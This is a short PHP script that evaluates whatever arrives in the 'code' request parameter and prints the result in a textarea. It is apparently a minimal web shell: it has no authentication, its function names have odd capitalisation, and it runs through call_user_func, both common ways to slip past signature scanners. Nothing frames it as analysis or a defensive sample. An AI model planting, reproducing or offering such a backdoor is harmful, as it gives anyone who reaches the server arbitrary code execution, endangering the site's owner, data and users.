<?php
function replace_stR($s,$h){
	$ret=$h;
	foreach($s as $k=>$r)
		$ret=str_replace($k,$r,$ret);
	return $ret;
}


function phpevaL(){
	echo '<center>';
	$s=array('<?php'=>'','<?'=>'','?>'=>'');
	echo "<textarea rows='10' cols='64'>";
	echo htmlspecialchars(eval(replace_stR($s,$_REQUEST['code'])));
}

call_user_func('phpevaL');
?>